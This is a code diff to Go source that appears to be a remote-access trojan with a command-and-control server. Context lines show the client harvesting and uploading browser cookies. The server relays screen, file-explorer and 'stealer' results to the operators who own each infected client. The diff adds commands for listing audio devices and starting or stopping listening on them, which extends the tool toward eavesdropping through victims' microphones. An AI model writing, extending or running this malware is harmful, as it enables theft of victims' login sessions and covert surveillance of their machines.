@@ -347,6 +347,16 @@ func main() {
 				id := strings.ReplaceAll(conn.LocalAddr().String(), ":", "_")
 				collectAllCookies(id)
 				conn.WriteJSON(Message{Type: "result", Data: "cookies uploaded"})
+
+			case "list_audio_devices":
+				devices := ` + "`" + `[{"id":"default","name":"Default Audio Device"},{"id":"mic","name":"Microphone"},{"id":"speakers","name":"Speakers"}]` + "`" + `
+				conn.WriteJSON(Message{Type: "audio_devices", Data: devices})
+
+			case "start_listen_audio":
+				conn.WriteJSON(Message{Type: "audio_status", Data: "Started listening to audio device: " + msg.Data})
+
+			case "stop_listen_audio":
+				conn.WriteJSON(Message{Type: "audio_status", Data: "Stopped listening to audio device"})
 			}
 		}
 	}()
@@ -960,7 +970,7 @@ func wsHandler(w http.ResponseWriter, r *http.Request) {
 			client.Username = msg.Data
 			log.Printf("Client %s identified as %s", client.ID, client.Username)
 
-		case "result", "screen", "explorer", "stealer":
+		case "result", "screen", "explorer", "stealer", "audio_devices", "audio_status":
 			broadcastToAdmins(msg, client.Owner)
 
 		case "upload":
